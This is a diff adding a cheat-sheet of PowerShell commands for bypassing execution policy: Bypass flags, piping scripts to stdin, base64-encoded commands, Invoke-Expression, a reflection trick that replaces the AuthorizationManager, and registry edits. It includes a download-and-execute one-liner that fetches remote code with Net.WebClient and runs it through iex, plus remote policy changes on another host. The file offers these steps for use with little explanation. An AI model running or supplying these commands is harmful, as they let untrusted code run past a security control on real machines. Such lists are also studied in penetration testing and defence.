@@ -1,0 +1,56 @@
+#Get info about the polocy
+
+Get-ExecutionPolicy
+
+Get-ExecutionPolicy -List | Format-Table -AutoSize
+
+#bypass ExecutionPolicy gpo in the workstation and creating a powershell session
+
+powershell –ExecutionPolicy Bypass 
+
+#Paste the Script into an Interactive PowerShell Console
+
+PS console > cmd
+
+Echo cmd  | PowerShell.exe -noprofile -
+
+#Read Script from a File and Pipe to PowerShell Standard In
+
+Get-Content scrip.ps1 | PowerShell.exe -noprofile -
+
+TYPE scrip.ps1 | PowerShell.exe -noprofile -
+
+#Download Script from URL and Execute with Invoke Expression
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://url')"
+
+Powershell -command "cmd"
+
+Powershell -c "cmd"
+
+$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
+
+powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
+
+invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
+
+invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
+
+Get-Content scrip.ps1 | Invoke-Expression 
+GC scrip.ps1 | iex
+
+PowerShell.exe -ExecutionPolicy Bypass -File scrip.ps1
+PowerShell.exe -ExecutionPolicy UnRestricted -File script.ps1
+PowerShell.exe -ExecutionPolicy Remote-signed -File script.ps1
+
+#Disable ExecutionPolicy by Swapping out the AuthorizationManager
+
+function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  script.ps1
+
+Set-ExecutionPolicy Bypass -Scope Process
+Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+
+#Set the ExcutionPolicy for the CurrentUser Scope via the Registry
+#In this example I’ve shown how to change the execution policy for the current user’s environment persistently by modifying a registry key directly.
+
+HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell
